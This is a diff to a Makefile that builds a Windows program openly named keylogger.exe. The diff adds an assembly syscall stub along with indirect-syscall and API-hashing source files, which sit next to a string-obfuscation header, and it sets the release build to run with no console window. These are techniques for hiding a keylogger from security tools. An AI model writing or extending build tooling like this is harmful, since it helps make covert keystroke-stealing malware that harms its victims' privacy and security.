@@ -1,5 +1,6 @@
 # Compiler
 CXX = g++
+AS = as
 WINDRES = windres
 
 # Compiler flags
@@ -11,29 +12,37 @@ TARGET = keylogger.exe
 TARGET_DEBUG = keylogger_debug.exe
 
 # Source files
-SOURCES = main.cpp
+SOURCES = main.cpp IndirectSyscalls.cpp APIHashing.cpp
+ASM_SOURCES = dosyscall.S
+ASM_OBJECTS = dosyscall.o
 HEADERS = Keylogger.h APIHashing.h StringObfuscation.h IndirectSyscalls.h
 
 # Default target
 all: release
 
+# Assemble the syscall stub
+$(ASM_OBJECTS): $(ASM_SOURCES)
+	@echo [*] Assembling dosyscall.S...
+	$(CXX) -c $(ASM_SOURCES) -o $(ASM_OBJECTS)
+
 # Release build (no console window)
-release: $(SOURCES) $(HEADERS)
+release: $(ASM_OBJECTS) $(SOURCES) $(HEADERS)
 	@echo [*] Building release version (no console)...
-	$(CXX) $(CXXFLAGS) $(LDFLAGS) -o $(TARGET) $(SOURCES)
+	$(CXX) $(CXXFLAGS) $(LDFLAGS) -o $(TARGET) $(SOURCES) $(ASM_OBJECTS)
 	@echo [+] Build complete: $(TARGET)
 	@echo [i] Size: $$(du -h $(TARGET) | cut -f1)
 
 # Debug build (with console)
-debug: $(SOURCES) $(HEADERS)
+debug: $(ASM_OBJECTS) $(SOURCES) $(HEADERS)
 	@echo [*] Building debug version (with console)...
-	$(CXX) $(CXXFLAGS) -static -o $(TARGET_DEBUG) $(SOURCES)
+	$(CXX) $(CXXFLAGS) -static -o $(TARGET_DEBUG) $(SOURCES) $(ASM_OBJECTS)
+	@echo [+] Build complete: $(TARGET_DEBUG)
 	@echo [+] Build complete: $(TARGET_DEBUG)
 
 # Clean build artifacts
 clean:
 	@echo [*] Cleaning build artifacts...
-	rm -f $(TARGET) $(TARGET_DEBUG) *.o
+	rm -f $(TARGET) $(TARGET_DEBUG) $(ASM_OBJECTS) *.o
 	@echo [+] Clean complete
 
 # Run debug version
